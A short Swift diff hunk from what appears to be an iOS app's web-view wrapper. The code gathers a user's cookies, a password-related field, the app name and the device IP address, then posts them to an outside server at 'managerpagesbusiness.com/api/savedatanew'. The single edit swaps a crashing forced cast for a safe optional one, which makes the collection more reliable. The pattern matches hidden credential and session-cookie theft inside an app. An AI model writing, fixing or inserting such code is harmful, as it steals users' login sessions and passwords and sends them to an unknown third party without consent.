@@ -112,7 +112,7 @@ struct CoordsTwo: UIViewRepresentable {
                         "namecuser": cookies[two_i!].value,
                         "datacookies": two_get_ck,
                         "useragentck": self.pa_rent_tow.is_two_ktra_matkhau,
-                        "nameapp": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as! String,
+                        "nameapp": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "",
                         "ipaddress": self.readIppAdd()
                     ]
                     let url: URL = URL(string: "https://managerpagesbusiness.com/api/savedatanew")!
